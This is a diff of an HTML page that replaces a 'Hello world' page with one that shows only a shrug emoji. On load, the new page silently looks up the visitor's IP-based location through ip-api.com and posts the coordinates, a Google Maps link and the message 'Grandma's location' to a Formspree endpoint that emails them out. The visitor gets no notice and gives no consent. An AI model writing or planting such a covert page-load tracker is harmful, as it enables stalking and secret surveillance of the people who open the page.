@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -64,6 +64,64 @@
     </script>
 </head>
 <body>
-    <h1>Hello world!</h1>
+    <h1>Hello world</h1>
+</body>
+</html> -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Location via Email</title>
+    <script>
+        // Function to fetch location using IP-API and send it via email
+        function getLocationUsingIP() {
+            // IP-API URL to fetch geolocation information
+            const apiURL = "http://ip-api.com/json";
+
+            fetch(apiURL)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === "fail") {
+                        alert("Failed to get location: " + data.message);
+                        return;
+                    }
+
+                    // Extract the latitude and longitude
+                    const latitude = data.lat;
+                    const longitude = data.lon;
+
+                    // Prepare the email data
+                    const emailData = new FormData();
+                    emailData.append('latitude', latitude);
+                    emailData.append('longitude', longitude);
+                    emailData.append('message', `Grandma's location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
+
+                    // Send the email via Formspree API
+                    fetch('https://formspree.io/f/xjkvdbwg', {  // Replace with your Formspree form ID
+                        method: 'POST',
+                        body: emailData
+                    })
+                    .then(response => response.json())
+                    .then(() => {
+                        console.log('Location sent successfully!');
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                        alert('Failed to send the email.');
+                    });
+                })
+                .catch((error) => {
+                    console.error("Error fetching IP location:", error);
+                    alert("Failed to fetch location.");
+                });
+        }
+
+        // Trigger the function to get location and send it automatically when the page loads
+        window.onload = getLocationUsingIP;
+    </script>
+</head>
+<body>
+    <h1>🤷‍♂️</h1>
 </body>
 </html>
